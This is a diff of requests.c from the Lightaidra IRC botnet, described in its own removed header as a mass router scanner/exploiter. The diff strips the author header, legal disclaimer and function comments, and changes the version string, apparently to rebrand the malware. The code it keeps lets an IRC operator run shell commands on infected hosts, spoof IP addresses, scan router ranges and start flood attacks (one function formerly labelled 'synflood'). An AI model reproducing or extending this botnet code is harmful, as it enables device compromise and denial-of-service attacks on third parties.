@@ -1,16 +1,3 @@
-/*
- * requests.c - USE LIGHTAIDRA AT YOUR OWN RISK!
- *
- * Lightaidra - IRC-based mass router scanner/exploiter.
- * Copyright (C) 2008-2015 Federico Fazzi, <eurialo@deftcode.ninja>.
- *
- * LEGAL DISCLAIMER: It is the end user's responsibility to obey 
- * all applicable local, state and federal laws. Developers assume 
- * no liability and are not responsible for any misuse or damage 
- * caused by this program.
- *
- */
-
 #include "../include/headers.h"
 
 int cmd_init(sock_t *sp);
@@ -227,8 +214,6 @@ void sigkill() {
     exit(EXIT_SUCCESS);
 }
 
-/* cmd_join(sock_t *) */ 
-/* join channel after connect. */ 
 int cmd_init(sock_t *sp) {
     if (sockwrite(sp->sockfd, "JOIN %s :%s\n", channel, irc_chankey))
         return EXIT_FAILURE;
@@ -236,8 +221,6 @@ int cmd_init(sock_t *sp) {
     return EXIT_SUCCESS;
 }
 
-/* cmd_ping(sock_t *) */ 
-/* reply PING with PONG. */ 
 int cmd_ping(sock_t *sp) {
     if (sockwrite(sp->sockfd, "PING 0313370\n"))
         return EXIT_FAILURE;
@@ -245,8 +228,6 @@ int cmd_ping(sock_t *sp) {
     return EXIT_SUCCESS;
 }
 
-/* cmd_login(sock_t *, requests_t *) */ 
-/* log in the party-line bot.  */ 
 void cmd_login(sock_t *sp, requests_t * req) {
     if (login_status) {
         if (login(sp, req) == true) login_status = true;
@@ -255,8 +236,6 @@ void cmd_login(sock_t *sp, requests_t * req) {
     return;
 }
 
-/* cmd_logout(sock_t *, requests_t *) */ 
-/* log out from party-line bot.  */ 
 void cmd_logout(sock_t *sp, requests_t *req) {
     if (sockwrite(sp->sockfd, "PRIVMSG %s :[logout] you are logged out!, (%s).\n", channel, req->rcv_a + 1))
         return;
@@ -265,8 +244,6 @@ void cmd_logout(sock_t *sp, requests_t *req) {
     return;
 }
 
-/* cmd_exec(sock_t *, requests_t *, *) */ 
-/* execute a system command.  */ 
 void cmd_exec(sock_t *sp, requests_t *req, char *token) {
     FILE *fd;
     char e_cmd[256], e_cmd_back[256];
@@ -300,15 +277,11 @@ void cmd_exec(sock_t *sp, requests_t *req, char *token) {
     return;
 }
 
-/* cmd_version(sock_t *) */ 
-/* show the current version of Aidra. */ 
 void cmd_version(sock_t *sp) {
-    sockwrite(sp->sockfd, "PRIVMSG %s :[version] lightaidra 0x2012.\n", channel);
+    sockwrite(sp->sockfd, "PRIVMSG %s :[version] 0x2016\n", channel);
     return;
 }
 
-/* cmd_status(sock_t * sp) */
-/* show the current status */
 void cmd_status(sock_t *sp) {
     if (!max_pids) sockwrite(sp->sockfd, "PRIVMSG %s :[status] currently not working.\n", channel);
     else sockwrite(sp->sockfd, "PRIVMSG %s :[status] working on %s\n", channel, status_temp);
@@ -316,8 +289,6 @@ void cmd_status(sock_t *sp) {
     return;
 }
 
-/* cmd_spoof(sock_t *, requests_t *) */
-/* set an address for ip spoofing */
 void cmd_spoof(sock_t *sp, requests_t *req) {
     if (parse_input_errors(sp, req, 1, 0)) return;
 
@@ -340,8 +311,6 @@ void cmd_spoof(sock_t *sp, requests_t *req) {
     return;
 }
 
-/* cmd_advscan(sock_t *, requests_t *) */ 
-/* start the advance scanner.  */ 
 int cmd_advscan(sock_t *sp, requests_t *req) {
     if (strlen(req->rcv_sb) < 1) return EXIT_FAILURE;
 
@@ -387,8 +356,6 @@ int cmd_advscan(sock_t *sp, requests_t *req) {
     return EXIT_SUCCESS;
 }
 
-/* cmd_advscan_recursive(sock_t *, requests_t *) */ 
-/* start the advance scanner in advscanrcs mode. */ 
 int cmd_advscan_recursive(sock_t *sp, requests_t *req) {
     if (strcmp(req->rcv_sb, ":.advscan->recursive") == 0) {
         if (strlen(req->rcv_sc) && strlen(req->rcv_sd)) {
@@ -444,10 +411,7 @@ int cmd_advscan_recursive(sock_t *sp, requests_t *req) {
     return EXIT_SUCCESS;
 }
 
-/* cmd_advscan_random(sock_t *, requests_t *) */ 
-/* start the advance scanner in x.B.x.x random mode. */ 
 int cmd_advscan_random(sock_t *sp, requests_t *req, int t) {
-    /* check for input errors */
     if (!strcmp(req->rcv_sb, ":.advscan->random") ||
         !strcmp(req->rcv_sb, ":.advscan->random->b")) {
         
@@ -551,8 +515,6 @@ int cmd_advscan_random(sock_t *sp, requests_t *req, int t) {
     return EXIT_SUCCESS;
 }
 
-/* cmd_stop(sock_t *) */ 
-/* stop the current working. */ 
 void cmd_stop(sock_t *sp) {
     if (max_pids > 0) {
         sockwrite(sp->sockfd, "PRIVMSG %s :[stop] %s was stopped!\n", channel, "operation");
@@ -565,8 +527,6 @@ void cmd_stop(sock_t *sp) {
     return;
 }
 
-/* cmd_setchan(sock_t *, requests_t *) */ 
-/* set new channel master.  */ 
 void cmd_setchan(sock_t *sp, requests_t *req) {
     if (strlen(req->rcv_sb) > 1) {
         snprintf(channel, sizeof(channel)-1, "%s", req->rcv_sb);
@@ -576,8 +536,6 @@ void cmd_setchan(sock_t *sp, requests_t *req) {
     return;
 }
 
-/* cmd_join(sock_t *, requests_t *) */ 
-/* join bot in some channel.  */ 
 void cmd_join(sock_t *sp, requests_t *req) {
     if (strlen(req->rcv_sb) > 0) {
         stop = 0;
@@ -587,8 +545,6 @@ void cmd_join(sock_t *sp, requests_t *req) {
     return;
 }
 
-/* cmd_part(sock_t *, requests_t *) */ 
-/* part bot from some channel.  */ 
 void cmd_part(sock_t *sp, requests_t *req) {
     if (strlen(req->rcv_sb) > 0) sockwrite(sp->sockfd, "PART %s :%s\n", req->rcv_sb, "Aidra?!");
     return;
@@ -610,8 +566,6 @@ void cmd_quit(sock_t *sp, requests_t *req) {
     exit(EXIT_SUCCESS);
 }
 
-/* *cmd_synflood(sock_t *, requests_t *) */ 
-/* start synflood attack.  */ 
 int cmd_packeting(sock_t *sp, requests_t *req) {
     if (strlen(req->rcv_sb) < 1) return EXIT_FAILURE;
 
